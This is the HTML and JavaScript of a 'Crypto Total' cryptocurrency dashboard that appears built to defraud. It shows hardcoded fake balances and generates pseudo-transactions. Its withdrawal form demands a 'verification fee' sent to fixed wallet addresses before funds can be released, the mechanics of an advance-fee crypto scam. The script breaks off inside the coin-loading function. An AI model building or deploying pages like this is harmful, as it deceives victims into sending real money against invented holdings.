<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Crypto Total Dashboard - Manage your cryptocurrency portfolio">
    <link rel="canonical" href="https://cryptototal.net/dashboard.html">
    <title>Dashboard - Crypto Total</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
            color: #ffffff;
            min-height: 100vh;
        }

        /* Navigation */
        nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 50px;
            background: rgba(10, 14, 39, 0.8);
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255, 140, 0, 0.1);
        }

        .logo-nav {
            display: flex;
            align-items: center;
            gap: 15px;
            font-size: 24px;
            font-weight: bold;
            background: linear-gradient(135deg, #ff8c00 0%, #ffa500 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .nav-right {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #e0e0e0;
        }

        .logout-btn {
            padding: 10px 20px;
            background: rgba(255, 140, 0, 0.2);
            border: 1px solid rgba(255, 140, 0, 0.3);
            border-radius: 8px;
            color: #ff8c00;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .logout-btn:hover {
            background: rgba(255, 140, 0, 0.3);
            border-color: #ff8c00;
        }

        /* Main Container */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 40px 20px;
        }

        .welcome-section {
            margin-bottom: 40px;
        }

        .welcome-section h1 {
            font-size: 42px;
            margin-bottom: 15px;
            background: linear-gradient(135deg, #ffffff 0%, #ff8c00 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 800;
            letter-spacing: -0.5px;
        }

        .welcome-section p {
            color: #a0a0a0;
            font-size: 18px;
            margin-bottom: 15px;
        }

        .welcome-section .subtitle {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-top: 15px;
            font-size: 14px;
            flex-wrap: wrap;
        }

        .welcome-section .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 6px 12px;
            background: rgba(74, 222, 128, 0.15);
            border: 1px solid rgba(74, 222, 128, 0.3);
            border-radius: 20px;
            color: #4ade80;
            font-size: 12px;
            font-weight: 600;
        }

        /* Stats Grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: rgba(26, 31, 58, 0.95);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(255, 140, 0, 0.1);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 3px;
            background: linear-gradient(90deg, #ff8c00, #ffa500);
            transform: scaleX(0);
            transition: transform 0.3s;
        }

        .stat-card:hover::before {
            transform: scaleX(1);
        }

        .stat-card:hover {
            border-color: rgba(255, 140, 0, 0.3);
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(255, 140, 0, 0.1);
        }

        .stat-card h3 {
            font-size: 14px;
            color: #a0a0a0;
            margin-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .stat-card .value {
            font-size: 32px;
            font-weight: 800;
            color: #ff8c00;
            margin-bottom: 5px;
        }

        .stat-card .change {
            font-size: 12px;
            color: #4ade80;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .stat-card .change.negative {
            color: #f87171;
        }

        /* Coins Grid */
        .coins-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .coin-card {
            background: rgba(26, 31, 58, 0.95);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid rgba(255, 140, 0, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .coin-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #ff8c00, #ffa500);
            transform: scaleX(0);
            transition: transform 0.3s;
        }

        .coin-card:hover::before {
            transform: scaleX(1);
        }

        .coin-card:hover {
            border-color: rgba(255, 140, 0, 0.3);
            transform: translateY(-5px);
            box-shadow: 0 25px 70px rgba(255, 140, 0, 0.2);
        }

        .coin-card .price-change {
            font-size: 12px;
            color: #4ade80;
            margin-top: 5px;
            display: flex;
            align-items: center;
            gap: 4px;
        }

        .coin-card .price-change.negative {
            color: #f87171;
        }

        .coin-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .coin-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .coin-icon {
            width: 60px;
            height: 60px;
            min-width: 60px;
            min-height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: rgba(255, 140, 0, 0.2);
            font-weight: 600;
            font-size: 24px;
            line-height: 1;
            overflow: hidden;
            flex-shrink: 0;
        }
        
        .coin-icon-text {
            font-size: 12px;
            font-weight: 700;
            letter-spacing: 0.3px;
        }

        .coin-details h3 {
            font-size: 20px;
            color: #ffffff;
            margin-bottom: 5px;
        }

        .coin-details p {
            font-size: 14px;
            color: #a0a0a0;
        }

        .coin-balance {
            text-align: right;
        }

        .coin-balance .amount {
            font-size: 24px;
            font-weight: 800;
            color: #4ade80;
            margin-bottom: 5px;
        }

        .coin-balance .usd {
            font-size: 14px;
            color: #a0a0a0;
        }

        .coin-actions {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }

        .coin-btn {
            flex: 1;
            padding: 12px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-withdraw {
            background: linear-gradient(135deg, #ff8c00 0%, #ffa500 100%);
            color: #ffffff;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.3);
        }

        .btn-withdraw:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 140, 0, 0.4);
        }

        .btn-deposit {
            background: rgba(26, 31, 58, 0.8);
            border: 2px solid rgba(255, 140, 0, 0.3);
            color: #ffffff;
        }

        .btn-deposit:hover {
            border-color: #ff8c00;
            background: rgba(255, 140, 0, 0.1);
        }

        /* Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            backdrop-filter: blur(5px);
            z-index: 1000;
            align-items: center;
            justify-content: center;
            overflow-y: auto;
            padding: 20px;
        }

        .modal.active {
            display: flex;
        }

        body.modal-open {
            overflow: hidden;
        }

        .modal-content {
            background: rgba(26, 31, 58, 0.98);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 90%;
            max-height: 90vh;
            overflow-y: auto;
            border: 1px solid rgba(255, 140, 0, 0.2);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            margin: auto;
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
        }

        .modal-header h2 {
            font-size: 24px;
            color: #ff8c00;
        }

        .close-btn {
            background: none;
            border: none;
            color: #a0a0a0;
            font-size: 28px;
            cursor: pointer;
            transition: color 0.3s;
        }

        .close-btn:hover {
            color: #ffffff;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #e0e0e0;
            font-size: 14px;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            background: rgba(10, 14, 39, 0.6);
            border: 2px solid rgba(255, 140, 0, 0.2);
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #ff8c00;
            box-shadow: 0 0 0 3px rgba(255, 140, 0, 0.1);
        }

        .form-group input::placeholder {
            color: #666;
        }

        .info-box {
            background: rgba(255, 140, 0, 0.1);
            border: 1px solid rgba(255, 140, 0, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .info-box p {
            color: #ffa500;
            font-size: 14px;
            line-height: 1.6;
        }

        .fee-notice {
            background: rgba(255, 68, 68, 0.1);
            border: 1px solid rgba(255, 68, 68, 0.3);
            border-radius: 10px;
            padding: 15px;
            margin-bottom: 20px;
        }

        .fee-notice p {
            color: #f87171;
            font-size: 14px;
            line-height: 1.6;
        }

        .submit-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #ff8c00 0%, #ffa500 100%);
            border: none;
            border-radius: 10px;
            color: #ffffff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(255, 140, 0, 0.3);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(255, 140, 0, 0.4);
        }

        .btn-secondary {
            padding: 12px 24px;
            background: rgba(26, 31, 58, 0.8);
            border: 2px solid rgba(255, 140, 0, 0.3);
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-secondary:hover {
            border-color: #ff8c00;
            background: rgba(255, 140, 0, 0.1);
        }

        .btn-copy {
            padding: 6px 12px;
            background: rgba(255, 140, 0, 0.2);
            border: 1px solid rgba(255, 140, 0, 0.3);
            border-radius: 6px;
            color: #ff8c00;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-copy:hover {
            background: rgba(255, 140, 0, 0.3);
            border-color: #ff8c00;
        }

        .submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* Transactions Section */
        .transactions-section {
            background: rgba(26, 31, 58, 0.95);
            border-radius: 20px;
            padding: 40px;
            border: 1px solid rgba(255, 140, 0, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(255, 140, 0, 0.1);
        }

        .section-header h2 {
            font-size: 28px;
            color: #ff8c00;
            font-weight: 700;
            margin-bottom: 0;
        }

        .section-header p {
            margin: 0;
        }

        .transactions-list {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .transaction-item {
            background: rgba(10, 14, 39, 0.7);
            border-radius: 15px;
            padding: 20px 25px;
            border: 1px solid rgba(255, 140, 0, 0.15);
            border-left: 4px solid rgba(255, 140, 0, 0.4);
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s;
            position: relative;
            margin-bottom: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
        }

        .transaction-item:hover {
            border-color: rgba(255, 140, 0, 0.4);
            border-left-color: #ff8c00;
            background: rgba(10, 14, 39, 0.9);
            transform: translateX(5px);
            box-shadow: 0 4px 16px rgba(255, 140, 0, 0.15);
        }

        .transaction-item.received {
            border-left-color: #4ade80;
        }

        .transaction-item.sent {
            border-left-color: #f87171;
        }

        .transaction-item.pending {
            border-left-color: #ffa500;
        }

        .transaction-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }

        .transaction-icon {
            font-size: 24px;
            width: 48px;
            height: 48px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, rgba(255, 140, 0, 0.2) 0%, rgba(255, 165, 0, 0.2) 100%);
            border: 2px solid rgba(255, 140, 0, 0.3);
            flex-shrink: 0;
        }

        .transaction-item.received .transaction-icon {
            background: linear-gradient(135deg, rgba(74, 222, 128, 0.2) 0%, rgba(74, 222, 128, 0.3) 100%);
            border-color: rgba(74, 222, 128, 0.4);
        }

        .transaction-item.sent .transaction-icon {
            background: linear-gradient(135deg, rgba(248, 113, 113, 0.2) 0%, rgba(248, 113, 113, 0.3) 100%);
            border-color: rgba(248, 113, 113, 0.4);
        }

        .transaction-item.pending .transaction-icon {
            background: linear-gradient(135deg, rgba(255, 165, 0, 0.2) 0%, rgba(255, 165, 0, 0.3) 100%);
            border-color: rgba(255, 165, 0, 0.4);
        }

        .transaction-details {
            flex: 1;
            min-width: 0;
        }

        .transaction-details h3 {
            font-size: 16px;
            margin-bottom: 8px;
            color: #ffffff;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
        }

        .transaction-details p {
            font-size: 13px;
            color: #a0a0a0;
            line-height: 1.5;
        }

        .transaction-amount {
            font-size: 18px;
            font-weight: 700;
            text-align: right;
            flex-shrink: 0;
            margin-left: 20px;
            white-space: nowrap;
        }

        .amount-positive {
            color: #4ade80;
        }

        .amount-negative {
            color: #f87171;
        }

        .empty-state {
            text-align: center;
            padding: 60px 20px;
            color: #a0a0a0;
        }

        .empty-state-icon {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.5;
        }

        .empty-state h3 {
            font-size: 20px;
            margin-bottom: 10px;
            color: #e0e0e0;
        }

        /* Responsive Design */
        @media (max-width: 1200px) {
            .container {
                padding: 30px 15px;
            }

            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }

            .coins-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 768px) {
            nav {
                padding: 15px 20px;
                flex-wrap: wrap;
            }

            .logo-nav {
                font-size: 20px;
            }

            .logo-nav span:first-child {
                font-size: 24px;
            }

            .nav-right {
                flex-direction: row;
                gap: 10px;
                width: 100%;
                margin-top: 10px;
                justify-content: space-between;
            }

            .user-info {
                font-size: 12px;
            }

            .logout-btn {
                padding: 8px 16px;
                font-size: 12px;
            }

            .container {
                padding: 20px 15px;
            }

            .welcome-section h1 {
                font-size: 32px;
            }

            .welcome-section p {
                font-size: 16px;
            }

            .stats-grid {
                grid-template-columns: 1fr;
                gap: 15px;
            }

            .stat-card {
                padding: 15px;
            }

            .stat-card .value {
                font-size: 24px;
            }

            .coins-grid {
                grid-template-columns: 1fr;
                gap: 15px;
            }

            .coin-card {
                padding: 15px;
            }

            .coin-header {
                flex-direction: column;
                gap: 15px;
            }

            .coin-info {
                width: 100%;
            }

            .coin-balance {
                width: 100%;
                text-align: left;
            }

            .coin-actions {
                flex-direction: column;
                gap: 10px;
            }

            .coin-btn {
                width: 100%;
            }

            .transaction-item {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
                padding: 15px;
            }

            .transaction-info {
                width: 100%;
            }

            .transaction-amount {
                width: 100%;
                text-align: left;
                margin-left: 0;
                margin-top: 10px;
            }

            .section-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 10px;
            }

            .section-header h2 {
                font-size: 24px;
            }

            /* Modal responsive */
            .modal {
                padding: 10px;
            }

            .modal-content {
                width: 95%;
                max-width: 95%;
                margin: 10px auto;
                padding: 20px;
                max-height: 95vh;
            }

            .modal-header h2 {
                font-size: 20px;
            }

            .form-group input {
                padding: 12px;
                font-size: 14px;
            }

            .info-box {
                padding: 12px;
            }

            .info-box p {
                font-size: 12px;
            }

            /* Toast responsive */
            .toast-container {
                top: 10px;
                right: 10px;
                left: 10px;
            }

            .toast {
                min-width: auto;
                max-width: 100%;
                padding: 12px 16px;
            }

            .toast-title {
                font-size: 14px;
            }

            .toast-message {
                font-size: 12px;
            }

            /* Deposit Modal QR Code */
            #deposit-qr-code {
                max-width: 200px;
                max-height: 200px;
            }
        }

        @media (max-width: 480px) {
            nav {
                padding: 12px 15px;
            }

            .logo-nav {
                font-size: 18px;
                gap: 10px;
            }

            .logo-nav span:first-child {
                font-size: 20px;
            }

            .welcome-section h1 {
                font-size: 28px;
            }

            .welcome-section p {
                font-size: 14px;
            }

            .stat-card .value {
                font-size: 20px;
            }

            .coin-icon {
                width: 50px;
                height: 50px;
                font-size: 20px;
            }

            .coin-icon-text {
                font-size: 10px;
            }

            .coin-details h3 {
                font-size: 18px;
            }

            .transaction-item {
                padding: 12px;
            }

            .transaction-icon {
                width: 40px;
                height: 40px;
                font-size: 18px;
            }

            .modal-content {
                padding: 15px;
            }

            .modal-header h2 {
                font-size: 18px;
            }

            .submit-btn, .btn-secondary {
                padding: 12px;
                font-size: 14px;
            }

            #deposit-qr-code {
                max-width: 180px;
                max-height: 180px;
            }
        }

        /* Toast Notifications */
        .toast-container {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 10000;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .toast {
            background: rgba(26, 31, 58, 0.98);
            border: 1px solid rgba(255, 140, 0, 0.3);
            border-radius: 12px;
            padding: 16px 20px;
            min-width: 300px;
            max-width: 500px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
            backdrop-filter: blur(10px);
            display: flex;
            align-items: flex-start;
            gap: 12px;
            animation: slideInRight 0.3s ease-out;
            position: relative;
        }

        .toast.success {
            border-color: rgba(74, 222, 128, 0.4);
        }

        .toast.error {
            border-color: rgba(255, 68, 68, 0.4);
        }

        .toast.warning {
            border-color: rgba(255, 140, 0, 0.4);
        }

        .toast.info {
            border-color: rgba(59, 130, 246, 0.4);
        }

        .toast-icon {
            font-size: 24px;
            flex-shrink: 0;
        }

        .toast-content {
            flex: 1;
        }

        .toast-title {
            font-weight: 600;
            font-size: 16px;
            color: #ffffff;
            margin-bottom: 4px;
        }

        .toast-message {
            font-size: 14px;
            color: #a0a0a0;
            line-height: 1.5;
            white-space: pre-wrap;
        }

        .toast-close {
            position: absolute;
            top: 8px;
            right: 8px;
            background: transparent;
            border: none;
            color: #a0a0a0;
            font-size: 20px;
            cursor: pointer;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 4px;
            transition: all 0.2s;
        }

        .toast-close:hover {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
        }

        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }

        @keyframes slideOutRight {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }

        .toast.hiding {
            animation: slideOutRight 0.3s ease-out forwards;
        }
    </style>
</head>
<body>
    <!-- Toast Container -->
    <div class="toast-container" id="toast-container"></div>
    <!-- Navigation -->
    <nav>
        <div class="logo-nav">
            <span style="font-size: 32px;">‚Çø</span>
            <span>Crypto Total</span>
        </div>
        <div class="nav-right">
            <div class="user-info">
                <span id="user-name">User</span>
            </div>
            <button class="logout-btn" onclick="handleLogout()">Logout</button>
        </div>
    </nav>

    <!-- Main Container -->
    <div class="container">
        <div class="welcome-section">
            <h1>Welcome back, <span id="welcome-name">User</span>!</h1>
            <p>Manage your cryptocurrency portfolio</p>
            <div class="subtitle">
                <span class="status-badge">
                    <span>‚úì</span>
                    <span>Account Verified</span>
                </span>
                <span style="color: #666;">‚Ä¢</span>
                <span style="color: #a0a0a0; font-size: 13px;">Last login: <span id="last-login">Just now</span></span>
            </div>
        </div>

        <!-- Stats Grid -->
        <div class="stats-grid">
            <div class="stat-card">
                <h3>üí∞ Total Portfolio Value</h3>
                <div class="value" id="total-value">$0.00</div>
                <div class="change" id="portfolio-change">
                    <span>‚Üó</span>
                    <span>+2.45% (24h)</span>
                </div>
            </div>
            <div class="stat-card">
                <h3>üìä Total Transactions</h3>
                <div class="value" id="stat-transactions">0</div>
                <div style="font-size: 12px; color: #a0a0a0; margin-top: 5px;">All time</div>
            </div>
            <div class="stat-card">
                <h3>üìà 24h Change</h3>
                <div class="value" id="stat-24h-change" style="color: #4ade80;">+$0.00</div>
                <div style="font-size: 12px; color: #a0a0a0; margin-top: 5px;">Portfolio performance</div>
            </div>
            <div class="stat-card">
                <h3>üîí Account Status</h3>
                <div class="value" style="font-size: 18px;">Verified ‚úì</div>
            </div>
        </div>

        <!-- Coins Grid -->
        <div class="coins-grid" id="coins-grid">
            <!-- Coins will be loaded here -->
        </div>

        <!-- Transactions Section -->
        <div class="transactions-section">
            <div class="section-header">
                <h2>Recent Transactions</h2>
            </div>
            <div class="transactions-list" id="transactions-list">
                <div class="empty-state">
                    <div class="empty-state-icon">üì≠</div>
                    <h3>No transactions yet</h3>
                    <p>Your transaction history will appear here</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Withdraw Modal -->
    <div class="modal" id="withdraw-modal" onclick="if(event.target === this) closeModal()">
        <div class="modal-content" onclick="event.stopPropagation()">
            <div class="modal-header">
                <h2>Withdraw Funds</h2>
                <button class="close-btn" onclick="closeModal()">&times;</button>
            </div>
            <form id="withdraw-form" onsubmit="handleWithdraw(event)">
                <div class="form-group">
                    <label>Coin</label>
                    <input type="text" id="withdraw-coin" readonly>
                </div>
                <div class="form-group">
                    <label>Available Balance</label>
                    <input type="text" id="withdraw-balance" readonly>
                </div>
                <div class="form-group">
                    <label for="withdraw-address">Recipient Address</label>
                    <input type="text" id="withdraw-address" placeholder="Enter recipient address" required>
                </div>
                <div class="form-group">
                    <label for="withdraw-amount">Amount</label>
                    <div style="position: relative; display: flex; align-items: center;">
                        <input type="number" id="withdraw-amount" step="0.00000001" placeholder="Enter amount" required style="padding-right: 60px;">
                        <span id="withdraw-amount-currency" style="position: absolute; right: 15px; color: #a0a0a0; font-weight: 500; pointer-events: none;">BTC</span>
                    </div>
                </div>
                <div class="fee-notice">
                    <p><strong>‚ö†Ô∏è Verification Fee Required</strong><br>
                    To complete this withdrawal, you must send a verification fee of <strong id="verification-fee-display">0.001 BTC</strong> <strong>in the same currency</strong> you wish to withdraw to the address below. This is a one-time security verification to protect your account.</p>
                    <p style="margin-top: 10px; color: #ff8c00;"><strong>‚ö†Ô∏è IMPORTANT:</strong> The verification fee must be paid in the same currency as your withdrawal. The recipient wallet address must be the same as the wallet address from which you send the verification fee. Withdrawals from different addresses will be rejected.</p>
                </div>
                <div class="info-box">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <p style="margin: 0;"><strong>Verification Address (<span id="verification-coin-display">BTC</span>):</strong></p>
                        <button type="button" class="btn-copy" onclick="copyToClipboard(document.getElementById('verification-address').textContent, 'Verification address')" style="padding: 6px 12px; font-size: 12px;">Copy</button>
                    </div>
                    <p id="verification-address" style="word-break: break-all; font-family: monospace; margin: 0; padding: 10px; background: rgba(0, 0, 0, 0.3); border-radius: 6px;">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</p>
                </div>
                <div style="display: flex; gap: 10px; margin-top: 20px;">
                    <button type="button" class="btn-secondary" onclick="closeModal()" style="flex: 1;">Cancel</button>
                    <button type="submit" class="submit-btn" id="withdraw-submit" style="flex: 1;">Confirm Withdrawal</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Deposit Modal -->
    <div class="modal" id="deposit-modal" onclick="if(event.target === this) closeDepositModal()">
        <div class="modal-content" onclick="event.stopPropagation()">
            <div class="modal-header">
                <h2>Deposit <span id="deposit-coin-symbol">BTC</span></h2>
                <button class="close-btn" onclick="closeDepositModal()">&times;</button>
            </div>
            <div style="text-align: center;">
                <div style="background: white; padding: 20px; border-radius: 12px; display: inline-block; margin: 20px 0;">
                    <canvas id="deposit-qr-code" style="max-width: 250px; max-height: 250px; display: none;"></canvas>
                    <div id="deposit-qr-code-container"></div>
                </div>
                <div class="info-box" style="margin-top: 20px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 8px;">
                        <p style="margin: 0;"><strong>Deposit Address:</strong></p>
                        <button type="button" class="btn-copy" onclick="copyToClipboard(document.getElementById('deposit-address').textContent, 'Deposit address')" style="padding: 6px 12px; font-size: 12px;">Copy</button>
                    </div>
                    <p id="deposit-address" style="word-break: break-all; font-family: monospace; margin: 0; padding: 10px; background: rgba(0, 0, 0, 0.3); border-radius: 6px;"></p>
                </div>
                <p style="color: #a0a0a0; margin-top: 15px; font-size: 14px;">
                    Send only <span id="deposit-coin-name">Bitcoin</span> to this address. Sending other cryptocurrencies may result in permanent loss.
                </p>
                <p style="color: #ff8c00; margin-top: 10px; font-size: 13px; font-weight: 600;">
                    ‚ö†Ô∏è Minimum deposit: 0.0001 <span id="deposit-coin-min">BTC</span>
                </p>
                <button type="button" class="submit-btn" onclick="closeDepositModal()" style="margin-top: 20px; width: 100%;">Close</button>
            </div>
        </div>
    </div>

    <!-- QR Code Library -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
    
    <!-- Supabase Configuration -->
    <script src="supabase-config.js"></script>
    <script src="supabase-utils.js"></script>
    <script src="generate-pseudo-transactions.js"></script>

    <script>
        const PREDEFINED_BALANCES = {
            'BTC': { balance: 1.5234, price: 45000, icon: '‚Çø' },
            'DOGE': { balance: 4876.23, price: 0.08, icon: 'üêï' },
            'ETH': { balance: 2.1456, price: 2800, icon: 'Œû' },
            'LTC': { balance: 10.234, price: 95, icon: '≈Å' },
            'XRP': { balance: 2534.67, price: 0.52, icon: 'XRP' },
            'ADA': { balance: 5123.45, price: 0.45, icon: '‚Ç≥' }
        };

        const COINGECKO_IDS = {
            'BTC': 'bitcoin',
            'DOGE': 'dogecoin',
            'ETH': 'ethereum',
            'LTC': 'litecoin',
            'XRP': 'ripple',
            'ADA': 'cardano'
        };

        let priceCache = null;
        let priceCacheTime = null;
        const PRICE_CACHE_DURATION = 60000; // 1 minute cache

        const VERIFICATION_FEES = {
            'BTC': 0.001,
            'DOGE': 1000,
            'ETH': 0.01,
            'LTC': 0.1,
            'XRP': 50,
            'ADA': 100
        };

        const VERIFICATION_ADDRESSES = {
            'BTC': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
            'DOGE': 'D7Y55v3bBvj5v3bBvj5v3bBvj5v3bBvj5v3b',
            'ETH': '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb',
            'LTC': 'ltc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
            'XRP': 'rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH',
            'ADA': 'addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'
        };

        window.addEventListener('DOMContentLoaded', function() {
            const currentUser = sessionStorage.getItem('currentUser');
            if (!currentUser) {
                window.location.href = 'login.html';
                return;
            }

            const user = JSON.parse(currentUser);
            loadUserData(user);
        });

        async function loadUserData(user) {
            document.getElementById('user-name').textContent = user.name;
            document.getElementById('welcome-name').textContent = user.name;
            const loginTime = new Date(user.loginTime || new Date());
            document.getElementById('last-login').textContent = getTimeAgo(loginTime);
            await loadCoins();
            if (!window.supabaseUtils) throw new Error('Supabase not initialized. Please wait...');
            const users = await window.supabaseUtils.getUsers();
            let userData = users[user.email] || { transactions: [] };
            if (!userData.transactions || userData.transactions.length < 5) {
                const simpleBalances = {};
                Object.keys(PREDEFINED_BALANCES).forEach(coin => {
                    simpleBalances[coin] = PREDEFINED_BALANCES[coin].balance || PREDEFINED_BALANCES[coin];
                });
                const coinBalances = userData.coinBalances || simpleBalances;
                const createdAt = userData.createdAt || new Date().toISOString();
                const pseudoTransactions = generatePseudoTransactions(coinBalances, createdAt);
                userData.transactions = [...(userData.transactions || []), ...pseudoTransactions];
                await window.supabaseUtils.saveUser(user.email, userData);
            }
            document.getElementById('stat-transactions').textContent = userData.transactions ? userData.transactions.length : 0;
            loadTransactions(userData.transactions || []);
        }

        function getTimeAgo(date) {
            const now = new Date();
            const diff = now - date;
            const minutes = Math.floor(diff / 60000);
            const hours = Math.floor(diff / 3600000);
            const days = Math.floor(diff / 86400000);
            
            if (minutes < 1) return 'Just now';
            if (minutes < 60) return `${minutes} minute${minutes > 1 ? 's' : ''} ago`;
            if (hours < 24) return `${hours} hour${hours > 1 ? 's' : ''} ago`;
            if (days < 7) return `${days} day${days > 1 ? 's' : ''} ago`;
            return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
        }

        async function fetchCoinPrices() {
            if (priceCache && priceCacheTime && (Date.now() - priceCacheTime) < PRICE_CACHE_DURATION) return priceCache;
            try {
                const coinIds = Object.values(COINGECKO_IDS).join(',');
                const response = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${coinIds}&vs_currencies=usd&include_24hr_change=true`);
                if (!response.ok) throw new Error('Failed to fetch prices');
                const data = await response.json();
                const prices = {};
                Object.entries(COINGECKO_IDS).forEach(([symbol, coinId]) => {
                    if (data[coinId]) {
                        prices[symbol] = { price: data[coinId].usd, change24h: data[coinId].usd_24h_change || 0 };
                    }
                });
                priceCache = prices;
                priceCacheTime = Date.now();
                Object.keys(PREDEFINED_BALANCES).forEach(symbol => {
                    if (prices[symbol]) PREDEFINED_BALANCES[symbol].price = prices[symbol].price;
                });
                return prices;
            } catch (error) {
                console.error('Error fetching coin prices:', error);
                return priceCache || {};
            }
        }

        async function loadCoins() {
            const coinsGrid = document.getElementById('coins-grid');
            let totalValue = 0;

            const prices = await fetchCoinPrices();
            const priceChanges = {};
            Object.keys(PREDEFINED_BALANCES).forEach(symbol => {
                if (prices[symbol] && prices[symbol].change24h !== undefined) {
                    priceChanges[symbol] = prices[symbol].change24h;
                } else {
                    priceChanges[symbol] = parseFloat((Math.random() * 6 - 3).toFixed(2));
                }
            });

            coinsGrid.innerHTML = Object.entries(PREDEFINED_BALANCES).map(([symbol, data]) => {
                const usdValue = data.balance * data.price;
                totalValue += usdValue;
